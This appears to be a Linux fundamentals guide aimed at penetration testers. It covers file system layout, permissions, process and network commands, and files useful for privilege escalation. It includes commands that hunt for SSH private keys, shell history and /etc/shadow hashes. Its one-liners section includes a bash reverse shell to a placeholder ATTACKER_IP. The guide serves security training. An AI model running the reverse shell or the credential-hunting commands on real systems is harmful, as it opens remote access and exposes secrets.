# 🐧 Linux Fundamentals

Essential Linux knowledge for cybersecurity professionals. This guide covers core concepts needed for penetration testing and system administration.

## Linux Directory Structure

```
/
├── bin/           Executable programs (ls, cp, mv)
├── sbin/          System executables (requires root)
├── boot/          Boot files and kernel
├── dev/           Device files (hardware access)
├── etc/           Configuration files (passwd, shadow, sudoers)
├── home/          User home directories
├── lib/           System libraries
├── opt/           Optional software packages
├── proc/          Virtual filesystem (running processes)
├── root/          Root user's home directory
├── tmp/           Temporary files (world writable)
├── usr/           User programs and data
├── var/           Variable data (logs, mail, databases)
└── srv/           Service data
```

### Key Directories for Hackers

| Path | Purpose | Importance |
|------|---------|------------|
| `/etc/passwd` | User accounts (plain text) | Critical |
| `/etc/shadow` | Password hashes (root only) | Critical |
| `/etc/sudoers` | Sudo permissions | Critical for PE |
| `/etc/cron.d/` | Scheduled tasks | Privilege escalation |
| `/home/` | User files | Information gathering |
| `/tmp/` | Temporary files | Often world-writable |
| `/var/log/` | System logs | Hiding tracks, forensics |
| `.ssh/` | SSH keys | Authentication bypass |

## Users and Permissions

### User Types

```bash
# Regular users
uid >= 1000  → Normal user account

# System users
uid 0        → Root (superuser)
uid 1-999    → System accounts (services)
```

### Permission Format

```bash
-rwxr-xr-x  1  user  group  4096  date  filename
↓ ↓↓↓ ↓↓↓ ↓↓↓
│ │││ │││ │││
│ │││ │││ └─┬─ Others (execute)
│ │││ │││   └── Others (write)
│ │││ │││       Others (read)
│ │││ ├─┬─ Group (execute)
│ │││ │ └── Group (write)
│ │││ └──── Group (read)
│ ├─┬─ User (execute)
│ │ └── User (write)
│ └──── User (read)
└────── File type (- = file, d = directory)
```

### Permission Numbers

```
r (read)    = 4
w (write)   = 2
x (execute) = 1

755 = rwxr-xr-x  (user full, others read+execute)
644 = rw-r--r--  (user read+write, others read)
777 = rwxrwxrwx  (everyone full access - dangerous!)
```

### Change Permissions

```bash
# Change to 755 (common for scripts)
chmod 755 script.sh

# Add execute permission
chmod +x script.sh

# Remove write for group/others
chmod go-w file.txt

# Change owner and group
chown user:group file.txt
```

## File and Process Operations

### Find Files

```bash
# Find by name
find / -name "passwd" -type f

# Find by type
find / -type f -name "*.sh"  # Files only
find / -type d -name "configs"  # Directories only

# Find by permissions
find / -perm 4000  # SUID files (privilege escalation!)
find / -perm 2000  # SGID files

# Find by size
find / -size +100M  # Larger than 100MB

# Find by modification time
find / -mtime -7  # Modified in last 7 days

# Find recently modified files
find / -mmin -30  # Modified in last 30 minutes
```

### View File Contents

```bash
# View entire file
cat file.txt

# View with line numbers
cat -n file.txt

# View first 10 lines
head file.txt
head -20 file.txt  # First 20 lines

# View last 10 lines
tail file.txt
tail -f logfile.txt  # Follow (streaming)

# Less paginated view (for large files)
less file.txt

# Search within file
grep "pattern" file.txt
grep -i "pattern" file.txt  # Case insensitive
grep -r "pattern" /path/  # Recursive search
```

### Process Management

```bash
# List running processes
ps aux           # All processes with details
ps auxww         # Full command line

# Filter processes
ps aux | grep apache

# Process information
top              # Real-time process monitor
htop             # Better top (if installed)

# Kill processes
kill PID
kill -9 PID      # Force kill (SIGKILL)
killall process_name

# Background/foreground
command &        # Run in background
fg               # Bring to foreground
bg               # Resume in background
Ctrl+Z           # Suspend current process
```

## Networking Commands

```bash
# Check IP configuration
ip addr show
ifconfig

# View routing table
ip route show
route -n

# Test connectivity
ping -c 4 8.8.8.8

# DNS lookup
nslookup google.com
dig google.com +short

# Network statistics
netstat -tuln    # Show listening ports
ss -tuln         # Modern alternative
netstat -tulnp   # Include process info

# Network interfaces
ip link show
ifconfig -a

# ARP table
arp -a           # IP to MAC mapping
ip neigh

# Traceroute
traceroute google.com
mtr google.com   # Better traceroute
```

## File Transfer

```bash
# Copy files (local)
cp source dest
cp -r directory/ /new/location/

# Secure copy (SSH)
scp local_file user@host:/remote/path
scp user@host:/remote/file .

# Download file
wget https://example.com/file.zip
curl https://example.com/file.zip -o file.zip

# Create tar archive
tar -czf archive.tar.gz /directory/
tar -xzf archive.tar.gz

# Secure file transfer (SFTP)
sftp user@host
```

## Text Processing

```bash
# Search and replace
sed 's/old/new/' file.txt      # Replace first occurrence
sed 's/old/new/g' file.txt     # Replace all

# Extract columns
cut -d ':' -f1 /etc/passwd     # First column (delimiter :)

# Sort and count
sort file.txt
uniq file.txt
sort file.txt | uniq -c        # Count occurrences

# Count lines/words/bytes
wc -l file.txt
wc -w file.txt
```

## User and Privilege Information

```bash
# Current user
whoami
id                 # UID, GID, groups

# Users on system
cat /etc/passwd
getent passwd

# User groups
groups
id username

# Sudo permissions
sudo -l            # What can I run with sudo?
cat /etc/sudoers   # Sudoers configuration (requires root)

# Switch user
su - username      # Switch to another user
sudo -u user command  # Run command as another user
```

## File System Checks

```bash
# Disk usage
df -h              # Human-readable disk space
du -sh /directory  # Directory size

# File type
file filename

# Check disk
fsck /dev/sda1     # Filesystem check (requires root)

# Mount filesystems
mount                 # Show mounted filesystems
mount /dev/sda1 /mnt  # Mount partition

# Unmount
umount /mnt
```

## Important Files for Penetration Testing

### Authentication
```bash
/etc/passwd       # User accounts (readable)
/etc/shadow       # Password hashes (root only)
/etc/group        # Group definitions

# Check password hash format
cat /etc/shadow | head -1
# username:$6$salt$hash:lastchange:mindays:maxdays:...
```

### Sudo Configuration
```bash
/etc/sudoers          # Sudo permissions
/etc/sudoers.d/       # Additional sudo rules

# Check if user can run without password
grep "NOPASSWD" /etc/sudoers
```

### SSH Keys
```bash
~/.ssh/id_rsa         # Private key
~/.ssh/id_rsa.pub     # Public key
~/.ssh/authorized_keys # Allowed keys
/root/.ssh/          # Root's SSH dir
```

### Cron Jobs
```bash
/etc/cron.d/       # System cron jobs
/etc/crontab       # System cron table
~/crontab          # User cron jobs
```

### System Logs
```bash
/var/log/auth.log  # Authentication attempts
/var/log/syslog    # System messages
/var/log/apt/      # Package manager logs
```

## Environment Variables

```bash
# View all variables
env
printenv

# Set variable (temporary)
export VARIABLE="value"

# Common variables
$HOME          # User's home directory
$USER          # Current username
$PATH          # Executables search path
$SHELL         # Current shell
$PWD           # Current directory
```

## Privilege Escalation - Quick Checks

```bash
# What can I run with sudo?
sudo -l

# SUID binaries (run as owner)
find / -perm 4000 2>/dev/null

# SGID binaries (run as group)
find / -perm 2000 2>/dev/null

# World-writable files
find / -perm 777 2>/dev/null

# Cron jobs
crontab -l
cat /etc/cron.d/*

# SSH keys lying around
find ~ -name "id_rsa" -o -name ".pem"

# Check shell history
history
cat ~/.bash_history
```

## Shell Scripting Basics

```bash
#!/bin/bash

# Variables
name="value"
echo $name

# Command output
output=$(command)
echo $output

# If statement
if [ condition ]; then
    echo "True"
fi

# For loop
for i in {1..10}; do
    echo $i
done

# Functions
function myfunc() {
    echo "Hello $1"
}
myfunc "World"
```

## Common One-Liners

```bash
# Reverse shell (bash to attacker IP)
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Encode/decode base64
echo "text" | base64
echo "base64string" | base64 -d

# Generate random password
openssl rand -base64 12

# Check open ports
netstat -tuln | grep LISTEN

# Find files modified today
find / -mtime 0

# List all users with UID 0
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Monitor file changes
watch 'ls -la /directory'
```

## Security Best Practices

✅ **Do:**
- Use strong passwords
- Keep system updated (`apt update && apt upgrade`)
- Monitor logs regularly
- Use SSH keys instead of passwords
- Set proper file permissions
- Run services with minimal privileges

❌ **Don't:**
- Run everything as root
- Put passwords in scripts
- Use world-writable directories for sensitive files
- Leave default credentials
- Disable security features
- Ignore security updates

## Related Resources

- [Privilege Escalation](../../Scripts/linux-privilege-escalation.md) — Advanced PE techniques
- [Web Security](../Web-Security/Web-Application-Security.md) — Web-specific attacks
- [Active Directory](../Active-Directory/Active-Directory.md) — Windows comparison

---

**Last Updated:** September 28, 2026